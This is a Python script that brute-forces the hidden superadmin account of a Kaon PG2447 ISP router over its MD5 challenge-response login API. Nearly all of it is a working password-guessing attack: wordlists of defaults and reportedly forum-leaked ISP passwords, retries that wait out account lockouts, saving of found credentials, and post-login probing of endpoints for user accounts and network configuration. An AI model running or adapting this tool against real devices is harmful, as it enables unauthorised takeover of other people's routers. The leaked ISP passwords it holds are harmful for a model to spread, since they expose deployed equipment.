#!/usr/bin/env python3
"""
Kaon PG2447 API Brute-Force - MD5 Challenge-Response Auth
==========================================================
Uses the discovered api/auth/token endpoint with MD5 challenge-response
to brute-force the L1vt1m4eng superadmin password.

Auth flow (discovered via JS console analysis):
  1. GET  /api/auth/token  → {"auth":{"challenge":"<hex>","mode":0}}
  2. hash = MD5(username + "_" + password + "_" + challenge)
  3. POST /api/auth/token  → {"auth":{"username":"...","hash":"..."}}
  4. 200 = success, 401 = wrong password
"""

import hashlib
import json
import time
import sys
import itertools
import string
import requests
from pathlib import Path

# ============================================================
# CONFIGURATION
# ============================================================
ROUTER_IP = "192.168.1.1"
BASE_URL = f"http://{ROUTER_IP}"
AUTH_ENDPOINT = f"{BASE_URL}/api/auth/token"
TARGET_USER = "L1vt1m4eng"

# Delay between attempts to avoid lockout (seconds)
DELAY = 0.3

# ============================================================
# PASSWORD LISTS
# ============================================================

# Priority 1: ISP default patterns (most likely)
ISP_PASSWORDS = [
    # Sticker password and common admin passwords
    "prv7rnhb", "admin", "password", "1234", "12345678",
    "admin123", "password1", "default", "root", "kaon",
    # Known TIM/ISP passwords from forums
    "smrf4xr1",  # Known Kaon TIM superadmin from forums
    "L1vt1m4eng", "livtim", "timlive", "tim2024", "tim2025",
    "tim@2024", "tim@2025", "timfibra", "ultrafibra",
    # Common Broadcom/Kaon defaults
    "broadcom", "Broadcom", "kaon123", "Kaon123",
    "support", "tech", "technician", "service",
    # Standard router passwords
    "guest", "user", "operator", "supervisor",
    "changeme", "letmein", "welcome", "access",
    # Numeric patterns
    "00000000", "11111111", "12345678", "87654321",
    "01234567", "98765432", "13579246", "24681357",
]

# Priority 2: Device-specific patterns (serial/MAC derived)
DEVICE_PATTERNS = [
    # Serial number patterns (Kaon uses KAON + digits)
    "KAON0000", "kaon0000",
    # MAC address patterns (last 6 chars)
    # Common Kaon MAC OUI: E4:3E:D7, 00:22:3F, A4:3E:51
]

# Priority 3: Base64-decoded password patterns from forums
FORUM_PASSWORDS = [
    # Passwords found decoded from other Kaon TIM units
    "smrf4xr1", "c3tyZjR4cjE=",  # base64 of smrf4xr1
    "admin123", "Kaon@2024", "L1vt1m@eng",
    # Portuguese keyboard patterns
    "qwerty", "qweasd", "asdqwe", "zxcasd",
]

# Priority 4: Alphanumeric brute-force (8 chars, lowercase + digits)
# This generates passwords like the sticker format: prv7rnhb, smrf4xr1


def get_challenge(session):
    """Get fresh challenge from router."""
    try:
        resp = session.get(AUTH_ENDPOINT, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            challenge = data.get("auth", {}).get("challenge", "")
            if challenge:
                return challenge
    except Exception as e:
        pass
    return None


def try_login(session, username, password, challenge):
    """
    Attempt login using MD5 challenge-response.
    Returns (success: bool, response_data: dict)
    """
    # Calculate MD5 hash: username_password_challenge
    hash_input = f"{username}_{password}_{challenge}"
    hash_value = hashlib.md5(hash_input.encode()).hexdigest()
    
    payload = {
        "auth": {
            "username": username,
            "hash": hash_value
        }
    }
    
    try:
        resp = session.post(
            AUTH_ENDPOINT,
            json=payload,
            timeout=5,
            headers={"Content-Type": "application/json"}
        )
        
        if resp.status_code == 200:
            return True, resp.json() if resp.text else {}
        elif resp.status_code == 401:
            return False, {}
        elif resp.status_code == 403:
            # Account locked
            return False, {"locked": True}
        elif resp.status_code == 429:
            # Rate limited
            return False, {"rate_limited": True}
        else:
            return False, {"status": resp.status_code}
    except requests.exceptions.ConnectionError:
        return False, {"connection_error": True}
    except Exception as e:
        return False, {"error": str(e)}


def generate_sticker_passwords():
    """
    Generate passwords matching the TIM sticker format.
    Pattern: 8 chars, lowercase letters + digits (e.g., prv7rnhb)
    """
    # Common patterns: consonant+vowel+digit combos
    charset = string.ascii_lowercase + string.digits
    
    # First generate common patterns
    common_starts = [
        "adm", "usr", "pwd", "key", "tim", "srv",
        "net", "wan", "lan", "cfg", "sys", "sup",
        "eng", "tec", "opr", "mng", "acc", "dev",
    ]
    
    for start in common_starts:
        for c1 in charset:
            for c2 in charset:
                for c3 in charset:
                    for c4 in charset:
                        for c5 in charset:
                            yield start + c1 + c2 + c3 + c4 + c5


def main():
    print("=" * 70)
    print("  Kaon PG2447 API Brute-Force")
    print("  Target: L1vt1m4eng @ 192.168.1.1")
    print("  Method: MD5 Challenge-Response via /api/auth/token")
    print("=" * 70)
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
        "Referer": f"{BASE_URL}/",
    })
    
    # Test connectivity
    print("\n[*] Testing router connectivity...")
    challenge = get_challenge(session)
    if not challenge:
        print("[!] Cannot reach router API at /api/auth/token")
        print("[!] Check if router is reachable and session is not locked")
        sys.exit(1)
    
    print(f"[+] Router reachable! Challenge: {challenge}")
    print(f"[+] Auth mechanism: MD5(username_password_challenge)")
    
    # =========================================
    # PHASE 1: Priority password list
    # =========================================
    all_passwords = ISP_PASSWORDS + DEVICE_PATTERNS + FORUM_PASSWORDS
    # Remove duplicates while preserving order
    seen = set()
    unique_passwords = []
    for p in all_passwords:
        if p not in seen:
            seen.add(p)
            unique_passwords.append(p)
    
    print(f"\n{'='*70}")
    print(f"  PHASE 1: Dictionary Attack ({len(unique_passwords)} passwords)")
    print(f"{'='*70}")
    
    attempts = 0
    lockout_count = 0
    
    for password in unique_passwords:
        attempts += 1
        
        # Get fresh challenge for each attempt
        challenge = get_challenge(session)
        if not challenge:
            print(f"\n[!] Lost connection. Waiting 30s...")
            time.sleep(30)
            session = requests.Session()
            challenge = get_challenge(session)
            if not challenge:
                print("[!] Cannot reconnect. Aborting.")
                break
        
        success, data = try_login(session, TARGET_USER, password, challenge)
        
        if success:
            print(f"\n{'*'*70}")
            print(f"  *** PASSWORD FOUND! ***")
            print(f"  Username: {TARGET_USER}")
            print(f"  Password: {password}")
            print(f"  Attempts: {attempts}")
            print(f"{'*'*70}")
            
            # Save to file
            result_file = Path(__file__).parent / "SUPERADMIN_CREDENTIALS.txt"
            with open(result_file, 'w') as f:
                f.write(f"Router: Kaon PG2447 (TIM Ultra Fibra)\n")
                f.write(f"IP: {ROUTER_IP}\n")
                f.write(f"Username: {TARGET_USER}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Found at attempt: {attempts}\n")
            print(f"[+] Credentials saved to: {result_file}")
            return
        
        if data.get("locked"):
            lockout_count += 1
            print(f"\n[!] Account LOCKED! Waiting 60s... (lockout #{lockout_count})")
            time.sleep(60)
            session = requests.Session()
            continue
        
        if data.get("rate_limited"):
            print(f"\n[!] Rate limited. Waiting 10s...")
            time.sleep(10)
            continue
        
        if data.get("connection_error"):
            print(f"\n[!] Connection error. Waiting 15s...")
            time.sleep(15)
            session = requests.Session()
            continue
        
        # Progress
        if attempts % 5 == 0:
            print(f"  [{attempts}/{len(unique_passwords)}] Tried: {password:20s} - FAIL", end='\r')
        
        time.sleep(DELAY)
    
    print(f"\n\n  Phase 1 complete: {attempts} attempts, no match")
    
    # =========================================
    # PHASE 2: Extended wordlist
    # =========================================
    print(f"\n{'='*70}")
    print(f"  PHASE 2: Extended Wordlist (common router passwords)")
    print(f"{'='*70}")
    
    extended = [
        # More ISP patterns
        "t1m@dm1n", "t1madm1n", "T1m@dm1n", "TIM@dm1n",
        "adm1n123", "p@ssw0rd", "P@ssw0rd", "P@ssword1",
        # Kaon model-specific
        "pg2447", "PG2447", "pg24470", "kaonpg24",
        "ar4010", "AR4010", "ar40100", "ar4010a",
        # Broadcom chip
        "bcm9685", "BCM9685", "bcm68560",
        # Year patterns
        "tim2020", "tim2021", "tim2022", "tim2023",
        "kaon2020", "kaon2021", "kaon2022", "kaon2023",
        "kaon2024", "kaon2025", "kaon2026",
        # Hash-like passwords
        "a1b2c3d4", "1a2b3c4d", "abcd1234", "1234abcd",
        "q1w2e3r4", "z1x2c3v4", "p1o2i3u4",
        # Admin variants
        "Admin123", "Admin@123", "admin@12",
        "root1234", "Root1234", "toor1234",
        # Network engineer patterns
        "cisco123", "juniper1", "nokia123",
        "huawei12", "zte12345", "fibra123",
        # Portuguese keyboard patterns 
        "mudar123", "trocar12", "senha123",
        "acesso12", "entrar12", "abrir123",
        # GPON/fiber patterns
        "gpon1234", "fiber123", "ont12345",
        "onu12345", "ftth1234", "xpon1234",
        # Common 8-char passwords
        "pass1234", "test1234", "temp1234",
        "demo1234", "help1234", "info1234",
    ]
    
    for password in extended:
        if password in seen:
            continue
        seen.add(password)
        attempts += 1
        
        challenge = get_challenge(session)
        if not challenge:
            print(f"\n[!] Connection lost. Waiting 30s...")
            time.sleep(30)
            session = requests.Session()
            challenge = get_challenge(session)
            if not challenge:
                break
        
        success, data = try_login(session, TARGET_USER, password, challenge)
        
        if success:
            print(f"\n{'*'*70}")
            print(f"  *** PASSWORD FOUND! ***")
            print(f"  Username: {TARGET_USER}")
            print(f"  Password: {password}")
            print(f"  Attempts: {attempts}")
            print(f"{'*'*70}")
            
            result_file = Path(__file__).parent / "SUPERADMIN_CREDENTIALS.txt"
            with open(result_file, 'w') as f:
                f.write(f"Router: Kaon PG2447 (TIM Ultra Fibra)\n")
                f.write(f"IP: {ROUTER_IP}\n")
                f.write(f"Username: {TARGET_USER}\n")
                f.write(f"Password: {password}\n")
            return
        
        if data.get("locked"):
            print(f"\n[!] LOCKED. Waiting 60s...")
            time.sleep(60)
            session = requests.Session()
            continue
        
        if data.get("connection_error"):
            time.sleep(15)
            session = requests.Session()
            continue
        
        if attempts % 5 == 0:
            print(f"  [{attempts}] Tried: {password:20s} - FAIL", end='\r')
        
        time.sleep(DELAY)
    
    # =========================================
    # PHASE 3: Also try admin user (might reveal more info)
    # =========================================
    print(f"\n\n{'='*70}")
    print(f"  PHASE 3: Verifying 'admin' user still works")
    print(f"{'='*70}")
    
    for user, pwd in [("admin", "prv7rnhb"), ("admin", "admin")]:
        challenge = get_challenge(session)
        if challenge:
            success, data = try_login(session, user, pwd, challenge)
            if success:
                print(f"  [+] Login SUCCESS: {user}/{pwd}")
                print(f"  [+] Response: {data}")
                
                # Try to fetch user accounts
                print(f"\n  [*] Attempting to read user accounts...")
                for endpoint in [
                    "/api/user/accounts",
                    "/api/system/users",
                    "/api/device/users", 
                    "/api/auth/users",
                    "/api/config/users",
                    "/api/admin/users",
                ]:
                    try:
                        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
                        if r.status_code == 200:
                            print(f"  [+] {endpoint}: {r.text[:500]}")
                    except:
                        pass
                
                # Try device info
                for endpoint in [
                    "/api/device/information",
                    "/api/device/status",
                    "/api/system/info",
                    "/api/network/wan",
                    "/api/network/lan",
                ]:
                    try:
                        r = session.get(f"{BASE_URL}{endpoint}", timeout=5)
                        if r.status_code == 200:
                            print(f"  [+] {endpoint}: {r.text[:500]}")
                    except:
                        pass
            else:
                print(f"  [-] Login FAILED: {user}/{pwd}")
        time.sleep(1)
    
    # =========================================
    # SUMMARY
    # =========================================
    print(f"\n{'='*70}")
    print(f"  TOTAL ATTEMPTS: {attempts}")
    print(f"  STATUS: Password not found in wordlist")
    print(f"{'='*70}")
    print(f"\n[*] The L1vt1m4eng password is not in common dictionaries.")
    print(f"[*] Options:")
    print(f"    1. Check router sticker for a SECOND password")
    print(f"    2. Try serial number / MAC address as password")
    print(f"    3. Full brute-force (8 chars, a-z0-9) = 2.8 trillion combos")
    print(f"    4. Contact TIM support for password reset")
    print(f"    5. Factory reset the router (WARNING: may lose ISP config)")


if __name__ == "__main__":
    main()
